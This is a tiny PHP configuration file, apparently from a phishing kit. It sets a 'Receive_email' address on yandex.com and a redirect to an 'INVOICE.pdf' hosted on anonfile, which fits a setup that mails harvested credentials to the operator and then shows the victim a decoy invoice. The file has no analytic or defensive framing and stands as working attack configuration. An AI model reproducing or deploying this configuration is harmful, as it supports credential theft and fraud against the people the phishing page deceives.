<?php 
$Receive_email="noratting@yandex.com";
$redirect="https://cdn-13.anonfile.com/92m3Qbv1o5/7b064f16-1588572658/INVOICE.pdf";
?>